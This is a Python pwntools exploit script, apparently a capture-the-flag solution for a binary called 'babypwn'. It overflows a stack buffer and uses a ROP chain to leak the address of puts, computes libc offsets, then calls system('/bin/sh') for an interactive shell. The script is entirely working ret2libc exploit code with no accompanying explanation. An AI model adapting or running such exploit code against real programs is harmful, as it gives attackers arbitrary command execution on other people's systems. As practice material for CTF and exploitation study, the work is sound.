from pwn import *

p=process("./babypwn")
libc=p.libc
elf=ELF("./babypwn")

rdi_add=0x401203
payload=0x88*'a'+p64(rdi_add)+p64(0x403FC8)+p64(0x401030)+p64(0x401169)
p.recvline()
p.sendline(payload)
leak = p.recvline(False)[:8]
leak += '\x00' * (8 - len(leak))
put_addr = u64(leak)
print put_addr

offset=put_addr-libc.symbols["puts"]

sys_addr=libc.symbols["system"]+offset
bin_ad=libc.search("/bin/sh").next()
bin_addr=bin_ad+offset
payload2=0x88*'a'+p64(rdi_add)+p64(bin_addr)+p64(sys_addr)+p64(0xdeadbeef)
p.recvline()
p.sendline(payload2)
p.interactive()

